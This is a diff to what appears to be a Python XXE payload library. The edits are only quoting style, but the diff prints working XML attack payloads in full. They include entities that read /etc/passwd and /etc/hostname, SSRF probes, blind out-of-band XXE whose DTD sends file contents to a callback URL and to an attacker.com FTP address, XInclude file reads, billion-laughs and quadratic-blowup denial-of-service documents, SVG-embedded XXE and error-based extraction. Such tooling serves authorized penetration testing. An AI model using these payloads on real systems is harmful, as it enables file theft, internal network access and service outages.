@@ -45,11 +45,11 @@ def file_disclosure_payloads(os_type: str = "linux") -> Generator[str, None, Non
         files = linux_files + windows_files
 
     for file_uri, desc in files:
-        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
+        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "{file_uri}">
 ]>
-<root><data>&xxe;</data></root>'''
+<root><data>&xxe;</data></root>"""
         yield {"payload": payload, "file": file_uri, "description": desc}
 
 
@@ -100,11 +100,11 @@ def ssrf_payloads(target_type: str = "generic") -> Generator[str, None, None]:
     target_list = targets.get(target_type, targets["generic"])
 
     for url, desc in target_list:
-        payload = f'''<?xml version="1.0"?>
+        payload = f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "{url}">
 ]>
-<foo>&xxe;</foo>'''
+<foo>&xxe;</foo>"""
         yield {"payload": payload, "target": url, "description": desc}
 
 
@@ -117,12 +117,12 @@ def blind_xxe_payloads(callback_url: str) -> Generator[str, None, None]:
         callback_url: Attacker-controlled callback URL (e.g., 'http://attacker.com')
     """
     # Basic OOB probe
-    payload_basic = f'''<?xml version="1.0"?>
+    payload_basic = f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "{callback_url}/probe">
   %xxe;
 ]>
-<foo>test</foo>'''
+<foo>test</foo>"""
     yield {
         "payload": payload_basic,
         "type": "basic_oob",
@@ -130,37 +130,37 @@ def blind_xxe_payloads(callback_url: str) -> Generator[str, None, None]:
     }
 
     # External DTD reference
-    payload_dtd = f'''<?xml version="1.0"?>
+    payload_dtd = f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
   %xxe;
 ]>
-<foo>test</foo>'''
+<foo>test</foo>"""
     yield {
         "payload": payload_dtd,
         "type": "external_dtd",
         "description": "External DTD reference",
-        "dtd_content": f'''<!ENTITY % file SYSTEM "file:///etc/hostname">
+        "dtd_content": f"""<!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{callback_url}/collect?data=%file;'>">
 %eval;
-%exfil;''',
+%exfil;""",
     }
 
     # FTP-based exfiltration (for multi-line files)
-    payload_ftp = f'''<?xml version="1.0"?>
+    payload_ftp = f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "{callback_url}/ftp.dtd">
   %xxe;
 ]>
-<foo>test</foo>'''
+<foo>test</foo>"""
     yield {
         "payload": payload_ftp,
         "type": "ftp_exfil",
         "description": "FTP-based exfiltration for multi-line files",
-        "dtd_content": f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
+        "dtd_content": """<!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:21/%file;'>">
 %eval;
-%exfil;''',
+%exfil;""",
     }
 
 
@@ -176,9 +176,9 @@ def xinclude_payloads() -> Generator[str, None, None]:
     ]
 
     for file_uri in files:
-        payload = f'''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+        payload = f"""<foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="{file_uri}"/>
-</foo>'''
+</foo>"""
         yield {"payload": payload, "file": file_uri, "type": "xinclude"}
 
 
@@ -196,15 +196,13 @@ def dos_payloads(depth: int = 3) -> Generator[str, None, None]:
     entities = ['<!ENTITY lol "lol">']
     for i in range(1, depth + 1):
         prev = f"lol{i-1}" if i > 1 else "lol"
-        entities.append(
-            f'<!ENTITY lol{i} "&{prev};&{prev};&{prev};&{prev};&{prev};">'
-        )
+        entities.append(f'<!ENTITY lol{i} "&{prev};&{prev};&{prev};&{prev};&{prev};">')
 
-    payload = f'''<?xml version="1.0"?>
+    payload = f"""<?xml version="1.0"?>
 <!DOCTYPE lolz [
   {chr(10).join(entities)}
 ]>
-<lolz>&lol{depth};</lolz>'''
+<lolz>&lol{depth};</lolz>"""
 
     yield {
         "payload": payload,
@@ -215,11 +213,11 @@ def dos_payloads(depth: int = 3) -> Generator[str, None, None]:
     }
 
     # Quadratic blowup
-    payload_quadratic = '''<?xml version="1.0"?>
+    payload_quadratic = """<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
 ]>
-<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>'''
+<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>"""
     yield {
         "payload": payload_quadratic,
         "type": "quadratic_blowup",
@@ -235,13 +233,13 @@ def svg_xxe_payload(file_uri: str = "file:///etc/passwd") -> str:
     Args:
         file_uri: File to read via XXE
     """
-    return f'''<?xml version="1.0" standalone="yes"?>
+    return f"""<?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
   <!ENTITY xxe SYSTEM "{file_uri}">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
   <text x="0" y="16" font-size="12">&xxe;</text>
-</svg>'''
+</svg>"""
 
 
 def error_based_payloads(callback_url: str) -> Generator[str, None, None]:
@@ -252,14 +250,14 @@ def error_based_payloads(callback_url: str) -> Generator[str, None, None]:
     Args:
         callback_url: URL for error-based extraction setup
     """
-    payload = f'''<?xml version="1.0"?>
+    payload = """<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval;
   %error;
 ]>
-<foo>test</foo>'''
+<foo>test</foo>"""
     yield {
         "payload": payload,
         "type": "error_based",
@@ -286,11 +284,11 @@ def protocol_payloads() -> Generator[str, None, None]:
     ]
 
     for uri, proto_type, desc in protocols:
-        payload = f'''<?xml version="1.0"?>
+        payload = f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "{uri}">
 ]>
-<foo>&xxe;</foo>'''
+<foo>&xxe;</foo>"""
         yield {
             "payload": payload,
             "protocol": proto_type,
